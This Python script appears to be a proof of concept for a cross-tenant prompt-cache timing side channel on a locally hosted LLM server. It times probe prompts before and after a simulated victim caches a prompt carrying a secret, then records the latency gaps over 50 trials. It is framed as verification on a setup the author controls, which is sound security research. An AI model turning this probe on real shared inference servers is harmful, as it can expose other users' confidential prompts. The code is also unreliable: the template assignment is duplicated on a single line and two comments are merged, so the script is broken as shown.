import requests, time, csv, uuid, statistics

URL = "http://localhost:8000/v1/completions"
MODEL = "deepseek-ai/DeepSeek-R1-Distill-Llama-8B"
N_TRIALS = 50

# A fixed "template" the attacker knows the shape of, but not the exact secret content.# In a real scenario the attacker wouldn't know this string - here we control it
# because we're the ones running both sides for verification purposes.
VICTIM_SECRET_PROMPT_TEMPLATE = "System context for user session: the confidential value is {secret}. Respond only with OK."VICTIM_SECRET_PROMPT_TEMPLATE = "System context for user session: the confidential value is {secret}. Respond only with OK."
def timed_request(prompt):
    payload = {"model": MODEL, "prompt": prompt, "max_tokens": 1, "temperature": 0}
    t0 = time.perf_counter()
    r = requests.post(URL, json=payload)
    r.raise_for_status()
    return time.perf_counter() - t0

def victim_send(secret):
    """Victim sends a prompt containing a secret, which becomes cached."""
    prompt = VICTIM_SECRET_PROMPT_TEMPLATE.format(secret=secret)
    timed_request(prompt)  # we don't care about victim's own latency here

def attacker_probe(secret_guess):
    """Attacker probes with a guess at the secret value; we only measure TTFT."""
    prompt = VICTIM_SECRET_PROMPT_TEMPLATE.format(secret=secret_guess)
    return timed_request(prompt)

results = []
for trial in range(N_TRIALS):
    # Fresh unique secret each trial so no cross-trial contamination
    secret = f"secret-{uuid.uuid4().hex[:12]}"

    # BEFORE: attacker probes the correct secret value BEFORE victim ever sends it
    before = attacker_probe(secret)

    # Victim sends the real secret -> gets cached
    victim_send(secret)

    # AFTER: attacker probes the *same* secret value again, now that victim cached it
    after = attacker_probe(secret)

    results.append((trial, before, after))
    print(f"trial={trial:02d}  before={before*1000:.1f}ms  after={after*1000:.1f}ms  "
          f"delta={ (before-after)*1000:.1f}ms  {'HIT-CONSISTENT' if after < before else 'NO SEPARATION'}")

with open("results/cross_tenant_verification.csv", "w", newline="") as f:
    w = csv.writer(f)
    w.writerow(["trial", "before_ms", "after_ms", "delta_ms"])
    for trial, before, after in results:
        w.writerow([trial, before*1000, after*1000, (before-after)*1000])

befores = [b for _, b, _ in results]
afters = [a for _, _, a in results]
consistent = sum(1 for _, b, a in results if a < b)

print(f"\n=== Summary ===")
print(f"Before mean: {statistics.mean(befores)*1000:.1f}ms  stdev: {statistics.stdev(befores)*1000:.1f}ms")
print(f"After  mean: {statistics.mean(afters)*1000:.1f}ms  stdev: {statistics.stdev(afters)*1000:.1f}ms")
print(f"Trials showing hit-consistent separation: {consistent}/{N_TRIALS} ({100*consistent/N_TRIALS:.0f}%)")
